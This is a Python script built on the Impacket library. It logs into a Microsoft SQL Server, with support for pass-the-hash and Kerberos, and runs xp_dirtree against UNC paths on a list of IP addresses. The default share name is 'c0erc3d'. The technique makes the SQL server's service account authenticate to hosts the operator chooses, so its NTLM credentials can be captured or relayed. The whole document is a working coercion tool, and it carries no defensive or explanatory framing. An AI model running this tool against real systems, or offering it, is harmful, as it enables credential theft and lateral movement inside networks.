#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Description:
#   [MS-TDS] & [MC-SQLR] example focused on xp_dirtree functionality.
#   This script allows automatic execution of xp_dirtree against a SQL server
#   and can target multiple IP addresses from a file.
#

import argparse
import sys
import logging
import os

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket import version, tds

class XP_DIRTREE_EXECUTOR:
    def __init__(self, sql, share_name="c0erc3d"):
        self.sql = sql
        self.share_name = share_name

    def execute_xp_dirtree(self, target_ip):
        """Execute xp_dirtree against the target IP with specified share name"""
        command = f"\\\\{target_ip}\\{self.share_name}"
        query = f"exec master.sys.xp_dirtree '{command}',1,1"
        print(f"[*] Executing: {query}")
        
        try:
            self.sql.sql_query(query)
            self.sql.printReplies()
            self.sql.printRows()
            return True
        except Exception as e:
            print(f"[-] Error executing xp_dirtree against {target_ip}: {str(e)}")
            return False

def process_ip_file(filename):
    """Read IP addresses from a file, one per line"""
    if not os.path.exists(filename):
        print(f"[-] File not found: {filename}")
        return []
    
    with open(filename, 'r') as f:
        ips = [line.strip() for line in f if line.strip()]
    
    return ips

if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, 
                                     description="MSSQL xp_dirtree executor - automatically executes xp_dirtree commands")

    parser.add_argument('target', action='store', 
                        help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-port', action='store', default='1433', 
                        help='target MSSQL port (default 1433)')
    parser.add_argument('-db', action='store', 
                        help='MSSQL database instance (default None)')
    parser.add_argument('-windows-auth', action='store_true', default=False, 
                        help='whether or not to use Windows Authentication (default False)')
    parser.add_argument('-debug', action='store_true', 
                        help='Turn DEBUG output ON')
    parser.add_argument('-share-name', action='store', default='c0erc3d',
                        help='Share name to use in xp_dirtree command (default: c0erc3d)')
    
    # Add arguments specific to xp_dirtree functionality
    parser.add_argument('-xp-target', action='store', 
                        help='Target IP to use in xp_dirtree command')
    parser.add_argument('-ip-file', action='store',
                        help='File containing target IPs to execute xp_dirtree against (one IP per line)')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", 
                      help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", 
                      help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", 
                      help='Use Kerberos authentication. Grabs credentials from ccache file '
                      '(KRB5CCNAME) based on target parameters.')
    group.add_argument('-aesKey', action="store", metavar="hex key", 
                      help='AES key to use for Kerberos Authentication (128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                      help='IP Address of the domain controller. If omitted it use the domain part (FQDN) '
                      'specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                      help='IP Address of the target machine. If omitted it will use whatever was specified as target.')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    
    # Check that at least one of -xp-target or -ip-file is specified
    if not options.xp_target and not options.ip_file:
        print("[-] Error: You must specify either -xp-target or -ip-file")
        parser.print_help()
        sys.exit(1)
        
    # Init the example's logger theme - fix for compatibility with newer Impacket versions
    if options.debug:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
    
    # Initialize logger properly based on your Impacket version
    try:
        logger.init()  # For newer versions of Impacket
    except TypeError:
        pass  # If init() fails, continue without it

    domain, username, password, remoteName = parse_target(options.target)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.target_ip is None:
        options.target_ip = remoteName

    if options.aesKey is not None:
        options.k = True

    # Connect to MSSQL server
    ms_sql = tds.MSSQL(options.target_ip, int(options.port), remoteName)
    ms_sql.connect()
    
    try:
        # Login to the MSSQL server
        if options.k is True:
            res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey,
                                      kdcHost=options.dc_ip)
        else:
            res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
        ms_sql.printReplies()
    except Exception as e:
        logging.debug("Exception:", exc_info=True)
        logging.error(str(e))
        res = False
        
    if res is True:
        # Create xp_dirtree executor
        executor = XP_DIRTREE_EXECUTOR(ms_sql, options.share_name)
        
        # Process targets
        targets = []
        
        # If a single target IP is specified
        if options.xp_target:
            targets.append(options.xp_target)
            
        # If a file with IPs is specified
        if options.ip_file:
            file_targets = process_ip_file(options.ip_file)
            targets.extend(file_targets)
            
        # Execute xp_dirtree against all targets
        print(f"[*] Executing xp_dirtree against {len(targets)} targets")
        for target_ip in targets:
            print(f"\n[*] Target: {target_ip}")
            executor.execute_xp_dirtree(target_ip)
            
    # Disconnect from the MSSQL server
    ms_sql.disconnect()
